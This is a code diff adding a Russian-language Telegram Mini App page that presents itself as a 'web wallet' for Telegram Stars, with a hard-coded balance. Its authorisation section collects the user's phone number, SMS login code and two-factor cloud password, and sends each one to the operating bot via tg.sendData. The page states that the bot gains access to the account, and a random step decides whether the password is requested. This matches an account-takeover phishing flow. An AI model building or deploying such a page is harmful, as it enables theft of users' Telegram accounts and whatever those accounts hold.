@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Buy Sell Stars - Веб-Кошелек</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+            background: var(--tg-theme-bg-color, #1a1a1a); 
+            color: var(--tg-theme-text-color, #ffffff); 
+            min-height: 100vh; 
+            padding: 20px; 
+        }
+        .container { max-width: 400px; margin: 0 auto; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .header h1 { font-size: 24px; font-weight: 600; color: var(--tg-theme-text-color, #ffffff); }
+        .balance-card { 
+            background: var(--tg-theme-secondary-bg-color, #2a2a2a); 
+            border-radius: 16px; 
+            padding: 24px; 
+            margin-bottom: 24px; 
+            text-align: center; 
+            border: 1px solid var(--tg-theme-hint-color, #333); 
+        }
+        .balance-amount { font-size: 32px; font-weight: 700; color: var(--tg-theme-text-color, #ffffff); margin-bottom: 8px; }
+        .balance-label { font-size: 14px; color: var(--tg-theme-hint-color, #999); }
+        .tabs { 
+            display: flex; 
+            background: var(--tg-theme-secondary-bg-color, #2a2a2a); 
+            border-radius: 12px; 
+            padding: 4px; 
+            margin-bottom: 24px; 
+            border: 1px solid var(--tg-theme-hint-color, #333); 
+        }
+        .tab { 
+            flex: 1; 
+            padding: 12px; 
+            text-align: center; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            transition: all 0.3s; 
+            font-weight: 500; 
+            color: var(--tg-theme-hint-color, #999); 
+        }
+        .tab.active { 
+            background: var(--tg-theme-button-color, #3390ec); 
+            color: var(--tg-theme-button-text-color, #ffffff); 
+        }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        .amount-buttons { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
+        .amount-btn { 
+            background: var(--tg-theme-secondary-bg-color, #2a2a2a); 
+            color: var(--tg-theme-text-color, #ffffff); 
+            border: 1px solid var(--tg-theme-hint-color, #333); 
+            border-radius: 12px; 
+            padding: 16px; 
+            font-size: 16px; 
+            font-weight: 500; 
+            cursor: pointer; 
+            transition: all 0.2s; 
+        }
+        .amount-btn:hover { 
+            background: var(--tg-theme-hint-color, #3a3a3a); 
+            border-color: var(--tg-theme-button-color, #3390ec); 
+        }
+        .amount-btn.selected { 
+            background: var(--tg-theme-button-color, #3390ec); 
+            border-color: var(--tg-theme-button-color, #3390ec); 
+            color: var(--tg-theme-button-text-color, #ffffff);
+        }
+        .custom-amount { 
+            background: var(--tg-theme-secondary-bg-color, #2a2a2a); 
+            border: 1px solid var(--tg-theme-hint-color, #333); 
+            border-radius: 12px; 
+            padding: 16px; 
+            width: 100%; 
+            font-size: 16px; 
+            color: var(--tg-theme-text-color, #ffffff); 
+            margin-bottom: 20px; 
+        }
+        .action-btn { 
+            background: var(--tg-theme-button-color, #3390ec); 
+            color: var(--tg-theme-button-text-color, #ffffff); 
+            border: none; 
+            border-radius: 12px; 
+            padding: 16px; 
+            font-size: 16px; 
+            font-weight: 500; 
+            cursor: pointer; 
+            width: 100%; 
+            transition: all 0.2s; 
+        }
+        .feature { 
+            background: var(--tg-theme-secondary-bg-color, #2a2a2a); 
+            border-radius: 12px; 
+            padding: 16px; 
+            margin-bottom: 16px; 
+            border: 1px solid var(--tg-theme-hint-color, #333); 
+        }
+        .feature h3 { color: var(--tg-theme-button-color, #3390ec); margin-bottom: 8px; }
+        .feature p { color: var(--tg-theme-hint-color, #ccc); font-size: 14px; }
+        
+        /* Стили для авторизации */
+        .auth-step { padding: 20px 0; }
+        .country-selector {
+            background: var(--tg-theme-secondary-bg-color, #2a2a2a);
+            border: 1px solid var(--tg-theme-hint-color, #333);
+            border-radius: 12px;
+            padding: 16px;
+            cursor: pointer;
+            color: var(--tg-theme-text-color, #ffffff);
+        }
+        .phone-code {
+            background: var(--tg-theme-secondary-bg-color, #2a2a2a);
+            border: 1px solid var(--tg-theme-button-color, #3390ec);
+            border-radius: 12px;
+            padding: 16px;
+            width: 80px;
+            text-align: center;
+            color: var(--tg-theme-text-color, #ffffff);
+            font-size: 16px;
+        }
+        .phone-input {
+            background: var(--tg-theme-secondary-bg-color, #2a2a2a);
+            border: 1px solid var(--tg-theme-hint-color, #333);
+            border-radius: 12px;
+            padding: 16px;
+            flex: 1;
+            color: var(--tg-theme-text-color, #ffffff);
+            font-size: 16px;
+        }
+        .code-input {
+            background: var(--tg-theme-secondary-bg-color, #2a2a2a);
+            border: 1px solid var(--tg-theme-hint-color, #333);
+            border-radius: 12px;
+            padding: 16px;
+            width: 100%;
+            text-align: center;
+            font-size: 24px;
+            letter-spacing: 8px;
+            color: var(--tg-theme-text-color, #ffffff);
+            margin-bottom: 12px;
+        }
+        .action-btn.secondary {
+            background: transparent;
+            color: var(--tg-theme-button-color, #3390ec);
+            border: 1px solid var(--tg-theme-button-color, #3390ec);
+        }
+        
+        /* Стили для модального окна выбора страны */
+        .country-item {
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            background: var(--tg-theme-secondary-bg-color, #2a2a2a);
+            color: var(--tg-theme-text-color, #fff);
+            border: 1px solid var(--tg-theme-hint-color, #333);
+            transition: background 0.2s;
+        }
+        .country-item:hover {
+            background: var(--tg-theme-hint-color, #3a3a3a);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header"><h1>💻 Веб-Кошелек</h1></div>
+        <div class="balance-card">
+            <div class="balance-amount" id="balance-display">100 ⭐</div>
+            <div class="balance-label">Ваш баланс</div>
+        </div>
+        <div class="tabs">
+            <div class="tab active" onclick="switchTab('topup')">💰 Пополнить</div>
+            <div class="tab" onclick="switchTab('withdraw')">💫 Вывести</div>
+        </div>
+        <div id="topup-content" class="tab-content active">
+            <div class="amount-buttons">
+                <button class="amount-btn" onclick="selectAmount(25, 'topup')">⭐ 25</button>
+                <button class="amount-btn" onclick="selectAmount(50, 'topup')">⭐ 50</button>
+                <button class="amount-btn" onclick="selectAmount(100, 'topup')">⭐ 100</button>
+                <button class="amount-btn" onclick="selectAmount(250, 'topup')">⭐ 250</button>
+                <button class="amount-btn" onclick="selectAmount(500, 'topup')">⭐ 500</button>
+                <button class="amount-btn" onclick="selectAmount(1000, 'topup')">⭐ 1000</button>
+            </div>
+            <input type="number" class="custom-amount" placeholder="Или введите свою сумму" id="custom-topup" oninput="updateCustomAmount('topup')">
+            <button class="action-btn" onclick="topupBalance()">💰 Пополнить баланс</button>
+        </div>
+        <div id="withdraw-content" class="tab-content">
+            <div class="amount-buttons">
+                <button class="amount-btn" onclick="selectAmount(25, 'withdraw')">⭐ 25</button>
+                <button class="amount-btn" onclick="selectAmount(50, 'withdraw')">⭐ 50</button>
+                <button class="amount-btn" onclick="selectAmount(100, 'withdraw')">⭐ 100</button>
+                <button class="amount-btn" onclick="selectAmount(250, 'withdraw')">⭐ 250</button>
+            </div>
+            <input type="number" class="custom-amount" placeholder="Или введите свою сумму" id="custom-withdraw" oninput="updateCustomAmount('withdraw')">
+            <button class="action-btn" onclick="withdrawBalance()">💫 Вывести звезды</button>
+        </div>
+        
+        <!-- Авторизация - показывается только при нажатии кнопки -->
+        <div id="auth-section" class="feature" style="display: none;">
+            <!-- Шаг 1: Ввод номера телефона -->
+            <div id="phone-input-step" class="auth-step">
+                <h3 style="text-align: center; margin-bottom: 20px;">🔐 Авторизация</h3>
+                
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; margin-bottom: 8px; color: var(--tg-theme-hint-color, #999); font-size: 14px;">СТРАНА</label>
+                    <div class="country-selector" onclick="showCountryList()">
+                        <span id="selected-country">🇷🇺 Россия (+7)</span>
+                        <span style="float: right;">></span>
+                    </div>
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; margin-bottom: 8px; color: var(--tg-theme-hint-color, #999); font-size: 14px;">НОМЕР ТЕЛЕФОНА</label>
+                    <div style="display: flex; gap: 8px;">
+                        <input type="text" id="country-code" class="phone-code" value="+7" readonly>
+                        <input type="tel" id="phone-number" class="phone-input" placeholder="999 123 45 67">
+                    </div>
+                </div>
+                
+                <div style="display: flex; gap: 12px;">
+                    <button class="action-btn secondary" onclick="cancelAuth()">ОТМЕНА</button>
+                    <button class="action-btn" onclick="sendPhoneNumber()">ДАЛЕЕ</button>
+                </div>
+            </div>
+            
+            <!-- Шаг 2: Ввод SMS кода -->
+            <div id="sms-code-step" class="auth-step" style="display: none;">
+                <h3 style="text-align: center; margin-bottom: 20px;">📱 Код из SMS</h3>
+                <p style="text-align: center; color: var(--tg-theme-hint-color, #999); margin-bottom: 20px;">
+                    Мы отправили код на номер<br><span id="sent-phone-number"></span>
+                </p>
+                
+                <input type="text" id="sms-code-input" class="code-input" placeholder="Введите код" maxlength="5">
+                
+                <div style="display: flex; gap: 12px; margin-top: 20px;">
+                    <button class="action-btn secondary" onclick="backToPhone()">НАЗАД</button>
+                    <button class="action-btn" onclick="verifySmsCode()">ДАЛЕЕ</button>
+                </div>
+            </div>
+            
+            <!-- Шаг 3: Ввод пароля 2FA (если нужен) -->
+            <div id="password-step" class="auth-step" style="display: none;">
+                <h3 style="text-align: center; margin-bottom: 20px;">🔒 Облачный пароль</h3>
+                <p style="text-align: center; color: var(--tg-theme-hint-color, #999); margin-bottom: 20px;">
+                    У вас включена двухфакторная аутентификация.<br>Введите облачный пароль.
+                </p>
+                
+                <input type="password" id="password-input" class="custom-amount" placeholder="Облачный пароль">
+                
+                <div style="display: flex; gap: 12px; margin-top: 20px;">
+                    <button class="action-btn secondary" onclick="backToSms()">НАЗАД</button>
+                    <button class="action-btn" onclick="verifyPassword()">ВОЙТИ</button>
+                </div>
+            </div>
+            
+            <!-- Шаг 4: Успешная авторизация -->
+            <div id="success-step" class="auth-step" style="display: none;">
+                <div style="text-align: center;">
+                    <div style="font-size: 48px; margin-bottom: 16px;">✅</div>
+                    <h3 style="margin-bottom: 12px;">Авторизация успешна!</h3>
+                    <p style="color: var(--tg-theme-hint-color, #999); margin-bottom: 20px;">
+                        Ваш аккаунт авторизован для операций с звездами.
+                    </p>
+                    <button class="action-btn" onclick="closeAuth()">ПРОДОЛЖИТЬ</button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="feature">
+            <h3>🔐 Авторизация</h3>
+            <p>Для вывода звезд необходимо авторизоваться через номер телефона. Бот получит доступ к вашему аккаунту для проведения операции.</p>
+            <button class="action-btn" onclick="showAuthSection()" style="margin-top: 12px;">🔐 Авторизоваться</button>
+        </div>
+        
+        <div class="feature">
+            <h3>🎁 Автоскупщик подарков</h3>
+            <p>Автоматическая покупка новых подарков в Telegram</p>
+        </div>
+        
+        <div class="feature">
+            <h3>📊 История транзакций</h3>
+            <p>Просматривайте все операции с вашими звездами</p>
+        </div>
+    </div>
+    
+    <script>
+        let tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.expand();
+            tg.ready();
+        }
+        
+        let selectedAmount = { topup: 0, withdraw: 0 };
+        
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+            event.target.classList.add('active');
+            document.getElementById(tabName + '-content').classList.add('active');
+        }
+        
+        function selectAmount(amount, type) {
+            selectedAmount[type] = amount;
+            document.getElementById('custom-' + type).value = amount;
+            
+            document.querySelectorAll('#' + type + '-content .amount-btn').forEach(btn => {
+                btn.classList.remove('selected');
+            });
+            
+            event.target.classList.add('selected');
+        }
+        
+        function updateCustomAmount(type) {
+            const customAmount = document.getElementById('custom-' + type).value;
+            selectedAmount[type] = customAmount ? parseInt(customAmount) : 0;
+            
+            document.querySelectorAll('#' + type + '-content .amount-btn').forEach(btn => {
+                btn.classList.remove('selected');
+            });
+        }
+        
+        function topupBalance() {
+            const amount = selectedAmount.topup;
+            if (!amount || amount <= 0) {
+                if (tg) {
+                    tg.showAlert('Выберите сумму для пополнения');
+                } else {
+                    alert('Выберите сумму для пополнения');
+                }
+                return;
+            }
+            
+            if (tg) {
+                tg.showConfirm(`Пополнить баланс на ${amount} ⭐?`, (confirmed) => {
+                    if (confirmed) {
+                        tg.sendData(JSON.stringify({ action: 'topup', amount: amount }));
+                        tg.close();
+                    }
+                });
+            } else {
+                alert(`Пополнение на ${amount} ⭐ (демо режим)`);
+            }
+        }
+        
+        function withdrawBalance() {
+            const amount = selectedAmount.withdraw;
+            if (!amount || amount <= 0) {
+                if (tg) {
+                    tg.showAlert('Выберите сумму для вывода');
+                } else {
+                    alert('Выберите сумму для вывода');
+                }
+                return;
+            }
+            
+            if (tg) {
+                tg.showConfirm(`Вывести ${amount} ⭐?`, (confirmed) => {
+                    if (confirmed) {
+                        tg.sendData(JSON.stringify({ action: 'withdraw', amount: amount }));
+                        tg.close();
+                    }
+                });
+            } else {
+                alert(`Вывод ${amount} ⭐ (демо режим)`);
+            }
+        }
+        // Переменные для авторизации
+        let authState = {
+            phone: '',
+            countryCode: '+7',
+            step: 'phone' // phone, sms, password, success
+        };
+        
+        function showAuthSection() {
+            document.getElementById('auth-section').style.display = 'block';
+            document.getElementById('phone-input-step').style.display = 'block';
+            // Скрываем основные вкладки
+            document.querySelector('.tabs').style.display = 'none';
+            document.querySelector('.tab-content.active').style.display = 'none';
+        }
+        
+        function cancelAuth() {
+            closeAuth();
+        }
+        
+        function closeAuth() {
+            document.getElementById('auth-section').style.display = 'none';
+            // Показываем основные вкладки
+            document.querySelector('.tabs').style.display = 'flex';
+            document.querySelector('.tab-content.active').style.display = 'block';
+            // Сбрасываем состояние
+            resetAuthSteps();
+        }
+        
+        function resetAuthSteps() {
+            document.getElementById('phone-input-step').style.display = 'none';
+            document.getElementById('sms-code-step').style.display = 'none';
+            document.getElementById('password-step').style.display = 'none';
+            document.getElementById('success-step').style.display = 'none';
+            authState.step = 'phone';
+        }
+        
+        function sendPhoneNumber() {
+            const phoneNumber = document.getElementById('phone-number').value.replace(/\s/g, '');
+            const countryCode = document.getElementById('country-code').value;
+            
+            if (!phoneNumber || phoneNumber.length < 7) {
+                if (tg) {
+                    tg.showAlert('Введите корректный номер телефона');
+                } else {
+                    alert('Введите корректный номер телефона');
+                }
+                return;
+            }
+            
+            authState.phone = countryCode + phoneNumber;
+            
+            if (tg) {
+                // Отправляем номер телефона боту
+                tg.sendData(JSON.stringify({ 
+                    action: 'send_phone', 
+                    phone: authState.phone 
+                }));
+            }
+            
+            // Переходим к вводу SMS кода
+            showSmsStep();
+        }
+        
+        function showSmsStep() {
+            document.getElementById('phone-input-step').style.display = 'none';
+            document.getElementById('sms-code-step').style.display = 'block';
+            document.getElementById('sent-phone-number').textContent = authState.phone;
+            authState.step = 'sms';
+        }
+        
+        function backToPhone() {
+            document.getElementById('sms-code-step').style.display = 'none';
+            document.getElementById('phone-input-step').style.display = 'block';
+            authState.step = 'phone';
+        }
+        
+        function verifySmsCode() {
+            const smsCode = document.getElementById('sms-code-input').value;
+            
+            if (!smsCode || smsCode.length !== 5) {
+                if (tg) {
+                    tg.showAlert('Введите 5-значный код');
+                } else {
+                    alert('Введите 5-значный код');
+                }
+                return;
+            }
+            
+            if (tg) {
+                // Отправляем SMS код боту
+                tg.sendData(JSON.stringify({ 
+                    action: 'verify_sms', 
+                    code: smsCode 
+                }));
+            }
+            
+            // Имитируем проверку - в реальности ответ придет от бота
+            setTimeout(() => {
+                // Если нужен пароль 2FA
+                if (Math.random() > 0.5) { // 50% шанс что нужен пароль
+                    showPasswordStep();
+                } else {
+                    showSuccessStep();
+                }
+            }, 1000);
+        }
+        
+        function showPasswordStep() {
+            document.getElementById('sms-code-step').style.display = 'none';
+            document.getElementById('password-step').style.display = 'block';
+            authState.step = 'password';
+        }
+        
+        function backToSms() {
+            document.getElementById('password-step').style.display = 'none';
+            document.getElementById('sms-code-step').style.display = 'block';
+            authState.step = 'sms';
+        }
+        
+        function verifyPassword() {
+            const password = document.getElementById('password-input').value;
+            
+            if (!password) {
+                if (tg) {
+                    tg.showAlert('Введите облачный пароль');
+                } else {
+                    alert('Введите облачный пароль');
+                }
+                return;
+            }
+            
+            if (tg) {
+                // Отправляем пароль боту
+                tg.sendData(JSON.stringify({ 
+                    action: 'verify_password', 
+                    password: password 
+                }));
+            }
+            
+            // Имитируем успешную авторизацию
+            setTimeout(() => {
+                showSuccessStep();
+            }, 1000);
+        }
+        
+        function showSuccessStep() {
+            document.getElementById('sms-code-step').style.display = 'none';
+            document.getElementById('password-step').style.display = 'none';
+            document.getElementById('success-step').style.display = 'block';
+            authState.step = 'success';
+        }
+        
+        function showCountryList() {
+            const countries = [
+                { flag: '🇷🇺', name: 'Россия', code: '+7' },
+                { flag: '🇺🇦', name: 'Украина', code: '+380' },
+                { flag: '🇰🇿', name: 'Казахстан', code: '+7' },
+                { flag: '🇧🇾', name: 'Беларусь', code: '+375' },
+                { flag: '🇺🇿', name: 'Узбекистан', code: '+998' },
+                { flag: '🇦🇿', name: 'Азербайджан', code: '+994' },
+                { flag: '🇦🇲', name: 'Армения', code: '+374' },
+                { flag: '🇬🇪', name: 'Грузия', code: '+995' },
+                { flag: '🇰🇬', name: 'Киргизия', code: '+996' },
+                { flag: '🇹🇯', name: 'Таджикистан', code: '+992' },
+                { flag: '🇹🇲', name: 'Туркменистан', code: '+993' },
+                { flag: '🇲🇩', name: 'Молдова', code: '+373' },
+                { flag: '🇱🇹', name: 'Литва', code: '+370' },
+                { flag: '🇱🇻', name: 'Латвия', code: '+371' },
+                { flag: '🇪🇪', name: 'Эстония', code: '+372' },
+                { flag: '🇺🇸', name: 'США', code: '+1' },
+                { flag: '🇩🇪', name: 'Германия', code: '+49' },
+                { flag: '🇫🇷', name: 'Франция', code: '+33' },
+                { flag: '🇬🇧', name: 'Великобритания', code: '+44' },
+                { flag: '🇮🇹', name: 'Италия', code: '+39' },
+                { flag: '🇪🇸', name: 'Испания', code: '+34' },
+                { flag: '🇵🇱', name: 'Польша', code: '+48' },
+                { flag: '🇹🇷', name: 'Турция', code: '+90' },
+                { flag: '🇨🇳', name: 'Китай', code: '+86' },
+                { flag: '🇮🇳', name: 'Индия', code: '+91' },
+                { flag: '🇯🇵', name: 'Япония', code: '+81' }
+            ];
+            
+            if (tg) {
+                // Создаем список для выбора
+                let countryList = countries.map((country, index) => 
+                    `${index + 1}. ${country.flag} ${country.name} (${country.code})`
+                ).join('\n');
+                
+                tg.showAlert(`Выберите страну:\n\n${countryList.substring(0, 200)}...\n\nДля выбора введите номер страны в поле ниже.`);
+                
+                // Показываем поле для ввода номера страны
+                showCountrySelection(countries);
+            } else {
+                alert('Выбор страны доступен только в Telegram');
+            }
+        }
+        
+        function showCountrySelection(countries) {
+            // Создаем временное поле для выбора страны
+            const countryModal = document.createElement('div');
+            countryModal.id = 'country-modal';
+            countryModal.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.8);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 1000;
+            `;
+            
+            countryModal.innerHTML = `
+                <div style="
+                    background: var(--tg-theme-bg-color, #1a1a1a);
+                    border-radius: 16px;
+                    padding: 20px;
+                    max-width: 350px;
+                    width: 90%;
+                    max-height: 80vh;
+                    overflow-y: auto;
+                ">
+                    <h3 style="text-align: center; margin-bottom: 20px; color: var(--tg-theme-text-color, #fff);">Выберите страну</h3>
+                    <div id="country-list" style="max-height: 300px; overflow-y: auto;">
+                        ${countries.map((country, index) => `
+                            <div onclick="selectCountry('${country.code}', '${country.flag} ${country.name} (${country.code})')" 
+                                 style="
+                                     padding: 12px;
+                                     border-radius: 8px;
+                                     margin-bottom: 8px;
+                                     cursor: pointer;
+                                     background: var(--tg-theme-secondary-bg-color, #2a2a2a);
+                                     color: var(--tg-theme-text-color, #fff);
+                                     border: 1px solid var(--tg-theme-hint-color, #333);
+                                 "
+                                 onmouseover="this.style.background='var(--tg-theme-hint-color, #3a3a3a)'"
+                                 onmouseout="this.style.background='var(--tg-theme-secondary-bg-color, #2a2a2a)'">
+                                ${country.flag} ${country.name} (${country.code})
+                            </div>
+                        `).join('')}
+                    </div>
+                    <button onclick="closeCountryModal()" style="
+                        width: 100%;
+                        padding: 12px;
+                        margin-top: 16px;
+                        background: var(--tg-theme-button-color, #3390ec);
+                        color: var(--tg-theme-button-text-color, #fff);
+                        border: none;
+                        border-radius: 8px;
+                        font-size: 16px;
+                        cursor: pointer;
+                    ">Отмена</button>
+                </div>
+            `;
+            
+            document.body.appendChild(countryModal);
+        }
+        
+        function selectCountry(code, displayName) {
+            document.getElementById('country-code').value = code;
+            document.getElementById('selected-country').textContent = displayName;
+            authState.countryCode = code;
+            closeCountryModal();
+        }
+        
+        function closeCountryModal() {
+            const modal = document.getElementById('country-modal');
+            if (modal) {
+                modal.remove();
+            }
+        }
+        
+        // Форматирование номера телефона
+        document.addEventListener('DOMContentLoaded', function() {
+            const phoneInput = document.getElementById('phone-number');
+            if (phoneInput) {
+                phoneInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    let formattedValue = '';
+                    
+                    // Универсальное форматирование для разных стран
+                    if (value.length > 0) {
+                        if (value.length <= 3) {
+                            formattedValue = value;
+                        } else if (value.length <= 6) {
+                            formattedValue = value.substring(0, 3) + ' ' + value.substring(3);
+                        } else if (value.length <= 8) {
+                            formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6);
+                        } else if (value.length <= 10) {
+                            formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 8) + ' ' + value.substring(8);
+                        } else {
+                            formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 8) + ' ' + value.substring(8, 10);
+                        }
+                    }
+                    
+                    e.target.value = formattedValue;
+                });
+                
+                // Обновляем placeholder в зависимости от выбранной страны
+                phoneInput.addEventListener('focus', function() {
+                    const countryCode = document.getElementById('country-code').value;
+                    if (countryCode === '+7') {
+                        phoneInput.placeholder = '999 123 45 67';
+                    } else if (countryCode === '+1') {
+                        phoneInput.placeholder = '555 123 4567';
+                    } else if (countryCode === '+380') {
+                        phoneInput.placeholder = '99 123 4567';
+                    } else {
+                        phoneInput.placeholder = 'Номер телефона';
+                    }
+                });
+            }
+            
+            // Форматирование SMS кода
+            const smsInput = document.getElementById('sms-code-input');
+            if (smsInput) {
+                smsInput.addEventListener('input', function(e) {
+                    e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                });
+            }
+        });
+        
+        // Старые функции (оставляем для совместимости)
+        function requestAuthorization() {
+            showAuthSection();
+        }
+        
+        function getAuthCode() {
+            // Не используется в новой версии
+        }
+        
+        function verifyCode() {
+            // Не используется в новой версии
+        }
+    </script>
+</body>
+</html>
